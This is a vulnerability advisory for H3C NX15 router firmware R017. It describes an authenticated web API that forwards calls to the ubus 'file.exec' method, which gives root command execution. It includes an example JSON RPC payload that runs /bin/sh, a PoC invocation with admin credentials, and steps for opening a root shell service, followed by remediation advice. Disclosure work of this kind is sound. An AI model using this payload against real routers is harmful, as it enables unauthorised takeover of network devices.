# H3C NX15 R017 Exposed `file.exec` Authenticated Root Command Execution

## Summary

H3C NX15 Router firmware NX15V100R017 exposes the raw ubus object `file` through the authenticated `/api/esps` web API. The `file.exec` method is a native command-execution interface and runs with root privileges. An authenticated web administrator can invoke this method remotely and execute arbitrary commands as root.

## Vendor and Product

- Vendor: H3C
- Product: NX15 Router
- Affected firmware: NX15V100R017 / R017
- Component: `/api/esps` backend RPC
- Exposed object: `file`
- Exposed method: `exec`

## Vulnerability Type

- Improper exposure of dangerous system function
- Command execution by design exposed across an unsafe trust boundary
- Suggested CWE: CWE-749 Exposed Dangerous Method or Function
- Attack vector: Remote
- Authentication required: Yes
- Privileges required: Administrator web session
- User interaction required: No

## Impact

An authenticated attacker can execute arbitrary commands as root. Confirmed impact includes:

- Running basic commands through `file.exec`.
- Starting a temporary shell service.
- Connecting to the service and executing commands with UID 0.

## Technical Details

The web backend `/api/esps` contains generic ubus forwarding logic. Runtime testing confirmed that requests are not limited to `esps.*` objects and can reach the raw ubus object:

```text
file
```

The object exposes the method:

```text
file.exec {"command":"String","params":"Array","env":"Table"}
```

This method is intended for local system use and executes the supplied command as the privileged backend process. When exposed through `/api/esps`, it becomes a remote authenticated root command-execution primitive.

## Firmware Paths for Audit

The following paths are firmware-internal paths relative to the extracted firmware root filesystem:

- `/www/api`: web API binary that accepts authenticated `/api/esps` requests and forwards them to ubus objects.
- `file` ubus object provider: runtime ubus provider exposing `file.exec`; locate it in the extracted firmware by searching for the object name `file` and method name `exec`.
- `/bin/sh`: command interpreter used by the PoC when invoking `file.exec`.

Example RPC shape:

```json
[
  {
    "id": 1,
    "object": "file",
    "method": "exec",
    "param": {
      "command": "/bin/sh",
      "params": ["-c", "id >/tmp/file_exec_marker"],
      "env": {}
    }
  }
]
```

## Reproduction

Run the included PoC with valid administrator credentials:

```bash
python3 poc/17_postauth_file_exec_rce.py \
  --base http://192.168.8.1 \
  --username admin \
  --password '<admin-password>' \
  --port 2355
```

The PoC:

1. Authenticates to the web interface.
2. Calls `/api/esps` with object `file` and method `exec`.
3. Executes a command that starts a temporary shell service.
4. Connects to the shell and verifies root execution.

Expected result:

```text
uid=0(root)
```

## Evidence

- Runtime object enumeration confirmed that `file.exec` exists.
- Runtime testing confirmed that `/api/esps` can invoke `file.exec` using an authenticated web session.
- Commands executed through this method run as root.

## Attachments

- Report: `report/23_postauth_file_exec_rce_report.md`
- PoC: `poc/17_postauth_file_exec_rce.py`

## Remediation

- Prevent `/api/esps` from forwarding requests to raw ubus objects such as `file`.
- Add a strict object and method allowlist for web-exposed RPC.
- Deny access to command-execution primitives from the web management interface.
- If command execution is required internally, bind it to local-only callers and enforce caller identity checks.
